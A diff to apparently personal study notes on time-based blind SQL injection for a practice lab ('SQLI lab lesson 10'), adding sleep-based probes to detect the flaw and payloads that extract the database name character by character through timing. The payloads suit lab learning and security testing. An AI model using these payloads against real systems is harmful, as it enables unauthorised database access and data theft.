@@ -130,12 +130,18 @@
 ## Mostly same as Boolean Based Injection and used SQLI lab `lesson 10`
 
 
+## Identify the vulnerability
+
+`' and sleep(10)--+`
+
+`" and sleep(10)--+`
 
 ## Payload
 
-`" or if(100<200,sleep(10),Null)-- `
+`" and if(100<200,sleep(10),Null)--+`
 
-`" or if(ascii(substring(database(),1,1)) = 115,sleep(10),Null)-- -`
+`" and if(ascii(substring(database(),1,1)) = 115,sleep(10),Null)--+`
+
 
 
 
